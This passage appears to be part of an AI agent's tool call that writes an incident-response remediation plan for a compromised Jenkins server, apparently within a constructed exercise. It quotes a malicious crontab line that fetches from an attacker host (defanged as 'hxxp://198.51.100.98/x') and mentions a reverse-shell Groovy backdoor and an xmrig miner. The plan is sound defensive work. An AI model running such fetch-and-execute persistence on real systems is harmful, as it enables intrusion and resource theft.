te & quarantine cryptominer process and binary | `/opt/jenkins/.xmr/xmrig` | PROPOSED | `/disk/opt/jenkins/.xmr/xmrig:1` & `/sas/alerts.json:9` (Added missing cryptominer quarantine step) |\n| 7 | Re-enable Jenkins Security Realm and Authentication | `/var/lib/jenkins/config.xml` | PROPOSED | `/disk/var/lib/jenkins/config.xml:3` & `/sas/baseline.json:3` (Added missing configuration hardening step) |\n| 8 | Quarantine/Clean RCE Artifact | `/var/lib/jenkins/jobs/.tmp/config.xml` | PROPOSED | `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3` & `/sas/alerts.json:2` (Added missing RCE artifact cleanup) |\n\n## 3. Detailed Phase-by-Phase Remediation Plan\n\n### Phase 1: Immediate Network & Perimeter Isolation\n1. **Block Attacker IP:**\n   - Action: Add firewall drop rules for `198.51.100.98` at network perimeter and host `iptables`/`ufw`.\n   - Citation: `/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/crontabs/jenkins:5`\n   - Verification: Verify `iptables -L -n -v | grep 198.51.100.98` shows drop counters incrementing or blocking traffic.\n\n### Phase 2: Host Persistence Containment & Quarantine\n2. **Quarantine Groovy Init Hook Backdoor:**\n   - Action: Move `/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` to quarantine backup directory `/var/backups/quarantine/z-backdoor.groovy.bak` with permissions `000`.\n   - Citation: `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`\n   - Verification: Confirm file no longer exists in `/var/lib/jenkins/init.groovy.d/` and Jenkins restart logs show no reverse shell invocation.\n\n3. **Sanitize Crontab File:**\n   - Action: Backup `/var/spool/cron/crontabs/jenkins` to `/var/backups/quarantine/jenkins.crontab.bak`, then remove line 5 containing `curl hxxp://198.51.100.98/x` while preserving legitimate ops jobs (lines 2-4: `backup.sh`, `logrotate`, `check-health.sh`).\n   - Citation: `/disk/var/spool/cron/crontabs/jenkins:5`\n   - Verification: Run `crontab -u jenkins -l` and ensure line 5 is completely absent.\n\n4. **Revoke Unauthorized SSH Authorized Keys:**\n   - Action: Backup `/var/lib/jenkins/.ssh/authorized_keys` to quarantine, then remove the attacker's public key entry (`ssh-ed25519` / `ssh-rsa`).\n   - Citation: `/disk/var/lib/jenkins/.ssh/authorized_keys:2`\n   - Verification: Test SSH access using the backdoor key to confirm rejection.\n\n5. **Stop & Quarantine Cryptominer Binary:**\n   - Action: Terminate process pid 1337 (`xmrig`) if active, and move `/opt/jenkins/.xmr/` to `/var/backups/quarantine/xmr_directory.bak`.\n   - Citation: `/disk/opt/jenkins/.xmr/xmrig:1`, `/sas/alerts.json:9`\n   - Verification: Verify process list (`ps aux | grep xmrig`) is clear and CPU usage returns to normal baseline levels.\n\n6. **Quarantine RCE Artifact:**\n   - Action: Move `/var/lib/jenkins/jobs/.tmp/config.xml` to `/var/backups/quarantine/config.xml.bak`.\n   - Citation: `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3`\n   - Verification: Check `/var/lib/jenkins/jobs/.tmp/` is clear of residual exploit artifacts.\n\n### Phase 3: Vulnerability Patching & Configuration Hardening\n7. **Patch CVE-2024-23897:**\n   - Action: Upgrade Jenkins package to version LTS 2.426.3 or higher.\n   - Citation: `/sas/vulns.json:3`, `/sas/cti/advisory.txt:17`\n   - Verification: Check Jenkins version via web management interface or package manager (`dpkg -l jenkins`).\n\n8. **Enable Security Realm:**\n   - Action: Update `/var/lib/jenkins/config.xml` to set `<useSecurity>true</useSecurity>` and configure proper authentication realm.\n   - Citation: `/disk/var/lib/jenkins/config.xml:3`, `/sas/baseline.json:3`\n   - Verification: Access Jenkins web interface from unauthenticated browser session and confirm redirect to login prompt.\nEOF\n"] min_timeout_sec: 0.5 max_timeout_sec: 180.0
